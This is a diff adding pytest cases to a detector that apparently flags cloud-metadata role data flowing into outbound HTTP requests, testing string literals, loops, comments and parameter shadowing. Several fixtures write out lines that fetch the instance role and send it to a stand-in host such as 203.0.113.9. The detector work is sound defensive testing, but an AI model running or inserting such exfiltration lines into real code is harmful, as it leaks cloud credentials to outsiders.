@@ -428,6 +428,65 @@ def test_status_then_more_chained_is_still_a_response():
     assert _b339(blob).status == FAIL
 
 
+@pytest.mark.parametrize(
+    "line",
+    [
+        'requests.get("https://example.com/api", params={"role": "admin"})',
+        'requests.get("https://example.com/" + "role/list")',
+        'requests.get("https://example.com/?q=%s" % "role")',
+    ],
+)
+def test_tainted_name_only_inside_a_string_literal_is_not_fail(line):
+    # C-135 round 4: the word `role` in a literal is not the variable's value.
+    blob = (
+        "# file: probe.py\n"
+        f'role = requests.get("{_AWS}", timeout=2).text\n'
+        f"{line}\n"
+    )
+    assert _b339(blob).status != FAIL
+
+
+def test_string_decoy_before_the_real_name_still_fails():
+    blob = (
+        "# file: probe.py\n"
+        f'role = requests.get("{_AWS}", timeout=2).text\n'
+        'requests.get("http://203.0.113.9/?a=" + "role" + role)\n'
+    )
+    assert _b339(blob).status == FAIL
+
+
+def test_loop_rebinding_the_name_to_literals_is_not_fail():
+    blob = (
+        "# file: probe.py\n"
+        f'role = requests.get("{_AWS}", timeout=2).text\n'
+        'for role in ["admin", "viewer"]:\n'
+        '    requests.get("https://example.com/check?r=" + role)\n'
+    )
+    assert _b339(blob).status != FAIL
+
+
+@pytest.mark.parametrize("comment", ["#", "//"])
+def test_commented_out_sink_is_not_fail(comment):
+    blob = (
+        "# file: probe.py\n"
+        f'role = requests.get("{_AWS}", timeout=2).text\n'
+        f'{comment} requests.get("http://203.0.113.9/?r=" + role)\n'
+    )
+    assert _b339(blob).status != FAIL
+
+
+def test_function_parameter_shadowing_is_a_documented_fail():
+    # Dropping taint on a parameter of the same name would also hide
+    # `function send(role) {fetch("...?d=" + role)}; send(role)`; kept fail-closed.
+    blob = (
+        "# file: probe.py\n"
+        f'role = requests.get("{_AWS}", timeout=2).text\n'
+        "def check(role):\n"
+        '    requests.get("https://example.com/check?r=" + role)\n'
+    )
+    assert _b339(blob).status == FAIL
+
+
 def test_shell_header_auth_is_not_fail():
     blob = (
         "# file: auth.sh\n"
